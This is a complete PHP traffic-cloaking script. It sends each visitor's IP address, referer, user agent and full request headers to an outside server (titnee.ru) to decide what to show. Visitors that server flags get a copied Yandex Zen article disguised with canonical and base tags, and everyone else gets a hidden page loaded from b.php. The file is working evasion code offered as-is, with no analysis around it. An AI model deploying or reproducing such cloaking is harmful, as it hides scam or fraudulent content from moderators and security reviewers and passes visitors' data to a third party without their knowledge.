<?
 $white = 'https://zen.yandex.ru/media/cat_named_cat/kot-bolshe-ne-zahodit-v-vannuiu-5def3c183642b60db9e7a4ce';
 $admin = 'http://titnee.ru/';

 session_start();
 $post["ip"] = @$_SERVER["HTTP_CF_CONNECTING_IP"]? @$_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
 $post["domain"] = $_SERVER["HTTP_HOST"];
 $post["referer"] = @$_SERVER["HTTP_REFERER"];
 $post["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
 $post["headers"] = json_encode(apache_request_headers());
 $post["land"] = 1;

 $curl = curl_init("http://titnee.ru/api/check_ip");
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($curl, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
 curl_setopt($curl, CURLOPT_ENCODING, "");
 curl_setopt($curl, CURLOPT_TIMEOUT, 5);
 curl_setopt($curl, CURLOPT_POST, true);
 curl_setopt($curl, CURLOPT_POSTFIELDS, $post);

 $json_reqest = curl_exec($curl);
 curl_close($curl);
 $api_reqest = json_decode($json_reqest);

 if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
   $html =  file_get_contents($white);
    $html =  str_replace('<head>', '<head><link rel="canonical" href="'.$white.'"/>',$html);
    echo str_replace('<head>', '<head><base href="'.$white.'" />',$html);
 }else{
   require_once('b.php');
 }